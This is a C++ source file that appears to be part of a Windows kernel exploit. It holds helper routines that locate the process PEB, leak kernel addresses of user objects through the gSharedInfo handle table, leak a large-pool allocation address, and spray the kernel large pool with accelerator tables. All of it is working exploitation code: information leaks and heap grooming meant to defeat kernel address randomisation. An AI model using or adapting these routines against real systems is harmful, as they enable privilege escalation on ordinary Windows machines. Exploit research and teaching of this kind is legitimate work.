#include <iostream>
#include "helpers.h"

#include <winternl.h>

typedef __kernel_entry NTSTATUS(NTAPI* NTQUERYINFORMATIONPROCESS)(IN HANDLE ProcessHandle, IN PROCESSINFOCLASS ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength OPTIONAL);

void* getPebAddress() {
	PROCESS_BASIC_INFORMATION basicInfo = { 0 };
	unsigned long returned = 0;
	NTQUERYINFORMATIONPROCESS NtQueryInformationProcess;
	*(FARPROC*)&NtQueryInformationProcess = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
	NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &basicInfo,
		sizeof(PROCESS_BASIC_INFORMATION), &returned);
	return basicInfo.PebBaseAddress;
}

void* leakUserObjectAddress(void* handle) {
	USER_HANDLE_ENTRY* handleEntry = 0;
	SHAREDINFO* gSharedInfo = (SHAREDINFO*)GetProcAddress(GetModuleHandleA("user32.dll"), "gSharedInfo");
	USER_HANDLE_ENTRY* gHandleTable = gSharedInfo->aheList;
	handleEntry = &gHandleTable[(unsigned long long)handle & 0x000000000000FFFF];
	return handleEntry->pKernel;
}

void* leakLargePoolAllocationAddress() {
	char buff[10000];
	std::fill(buff, buff + 10000, 0x41);
	HACCEL atHandle = CreateAcceleratorTableA((LPACCEL)&buff, 700);
	void* kernelAddress = leakUserObjectAddress((void*)atHandle);
	std::cout << "Found KernelAddress at 0x" << std::hex << kernelAddress << std::endl;
	DestroyAcceleratorTable(atHandle);
	return kernelAddress;
}

HACCEL atSprayHandles[0x100];
void sprayLargePool() {
	char buff[10000];
	std::fill(buff, buff + 10000, 0x41);
	for (int i = 0; i < 0x100; ++i) {
		atSprayHandles[i] = CreateAcceleratorTableA((LPACCEL)&buff, 700);
	}
}
